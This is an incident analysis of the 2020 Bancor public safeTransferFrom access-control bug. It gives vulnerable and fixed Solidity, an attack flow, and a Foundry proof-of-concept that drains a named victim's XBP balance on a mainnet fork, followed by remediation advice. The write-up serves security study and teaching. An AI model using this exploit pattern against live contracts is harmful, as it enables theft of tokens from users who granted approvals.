# Bancor — Public `safeTransferFrom` Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2020-06-18 |
| **Protocol** | Bancor Protocol |
| **Chain** | Ethereum Mainnet |
| **Loss** | Limited damage (rapid response after vulnerability discovery) |
| **Attacker** | [Attacker Address](https://etherscan.io/address/0x09923e09FDECE38e3f843A1508Ef56b8fc66e9A8) |
| **Attack Tx** | [0x4643b63d...](https://etherscan.io/tx/0x4643b63dcbfc385b8ab8c86cbc46da18c2e43d277de3e5bc3b4516d3c0fdeb9f) |
| **Vulnerable Contract** | [0x5f58058C0eC971492166763c8C22632B583F667f](https://etherscan.io/address/0x5f58058C0eC971492166763c8C22632B583F667f) |
| **Root Cause** | The `safeTransferFrom` function in a newly deployed Bancor contract was exposed as `public`, allowing arbitrary users to transfer tokens on behalf of others |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-06/Bancor_exp.sol) |

---
## 1. Vulnerability Overview

Bancor is a liquidity provision and token swap protocol. In June 2020, a bug was discovered in several newly deployed Bancor contracts where the internal utility function `safeTransferFrom` was exposed with `public` visibility. Since this function can transfer ERC20 tokens from a `from` address to an arbitrary `to` address, an attacker could directly steal tokens from any user who had set an `approve` on the Bancor contract.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Bancor contract
contract BancorConverter {

    // ❌ Function that should be internal is incorrectly declared as public
    // Anyone can call this to transfer arbitrary users' tokens
    function safeTransferFrom(
        IERC20 _token,
        address _from,   // ❌ Arbitrary address can be specified
        address _to,     // ❌ Attacker address can be specified
        uint256 _value
    ) public {           // ❌ public → should be internal
        // Transfer succeeds if _from has granted allowance to this contract
        _token.transferFrom(_from, _to, _value);
    }
}

// ✅ Correct access control
contract BancorConverter {

    // ✅ Restricted to internal, preventing direct external calls
    function safeTransferFrom(
        IERC20 _token,
        address _from,
        address _to,
        uint256 _value
    ) internal {
        uint256 prevBalance = _token.balanceOf(_to);
        _token.transferFrom(_from, _to, _value);
        require(_token.balanceOf(_to) - prevBalance == _value, "transfer failed");
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**BancorNetwork.sol** — Entry point:
```solidity
// ❌ Root cause: The `safeTransferFrom` function in a newly deployed Bancor contract is exposed as `public`, allowing arbitrary users' tokens to be transferred
    function safeTransferFrom(IERC20Token _token, address _from, address _to, uint256 _value) public {  // ❌ Unauthorized transferFrom
       execute(_token, abi.encodeWithSelector(TRANSFER_FROM_FUNC_SELECTOR, _from, _to, _value));
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Identify victims who have approved the Bancor contract
    │       (Scan Approval events on-chain)
    │
    ├─[2] Check victim's allowance to the Bancor contract
    │       XBPToken.allowance(victim, bancorAddress) > 0
    │
    ├─[3] Call the public safeTransferFrom directly
    │       bancorContract.safeTransferFrom(
    │           XBPToken,
    │           victim,           ← victim address
    │           attacker,         ← attacker address
    │           victim_balance    ← victim's full balance
    │       )
    │
    └─[4] Full XBP token balance drained from victim
            (Completed in a single transaction with no flash loan required)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IBancor {
    // ❌ Internal transfer function exposed as public
    function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
}

contract BancorExploit is Test {
    address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f; // Vulnerable Bancor contract
    address victim        = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E; // Victim who approved Bancor
    address attacker      = address(this);
    IERC20 XBPToken       = IERC20(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40); // Exploited token

    IBancor bancorContract = IBancor(bancorAddress);

    function setUp() public {
        cheats.createSelectFork("mainnet", 10_307_563);
    }

    function testsafeTransfer() public {
        // Check victim's allowance granted to Bancor
        emit log_named_uint(
            "Victim XBPToken Allowance to Bancor : ",
            XBPToken.allowance(victim, bancorAddress) / 1 ether
        );

        // Record balances before attack
        emit log_named_uint("[Before] Victim Balance : ", XBPToken.balanceOf(victim) / 1 ether);
        emit log_named_uint("[Before] Attacker Balance : ", XBPToken.balanceOf(attacker) / 1 ether);

        // ⚡ Core exploit: directly call public safeTransferFrom to drain victim's tokens
        // Completed with a single function call, no prior capital required
        bancorContract.safeTransferFrom(
            IERC20(address(XBPToken)),
            victim,                          // from: victim
            attacker,                        // to: attacker
            XBPToken.balanceOf(victim)       // amount: victim's full balance
        );

        // Check balances after attack
        emit log_named_uint("[After] Victim Balance : ", XBPToken.balanceOf(victim) / 1 ether);
        emit log_named_uint("[After] Attacker Balance : ", XBPToken.balanceOf(attacker) / 1 ether);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Improper Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP** | A01:2021 - Broken Access Control |
| **Attack Complexity** | Very Low (single function call) |
| **Precondition** | Victim must have set `approve` on the vulnerable Bancor contract |
| **Impact** | All assets of approving users can be stolen |

---
## 6. Remediation Recommendations

1. **Principle of Least Visibility**: Internal utility functions should be declared `internal` or `private`; use `external`/`public` only when external exposure is explicitly required.
2. **Pre-Deployment Visibility Audit**: Enumerate all `public`/`external` functions and review the necessity of each external exposure.
3. **Automated Tooling**: Use static analysis tools such as Slither and MythX to detect unnecessarily exposed functions before deployment.
4. **Incident Response Plan**: Establish a system for immediately notifying users and guiding them to revoke allowances upon vulnerability discovery.

---
## 7. Lessons Learned

- **The Simplest Bug**: Not a complex mathematical vulnerability — a simple function visibility mistake can cause large-scale damage. This demonstrates how critical fundamental code review is.
- **The Risk of `approve`**: The ERC20 `approve` mechanism exposes user assets to risk when the approved contract is vulnerable. Users should only grant unlimited allowances to thoroughly trusted contracts.
- **Importance of Rapid Response**: Bancor notified users immediately upon discovering the vulnerability and upgraded the contracts. The swift response minimized losses.
- **Code Review Process**: Beyond external security audits before deployment, internal code reviews must systematically verify function visibility and access control.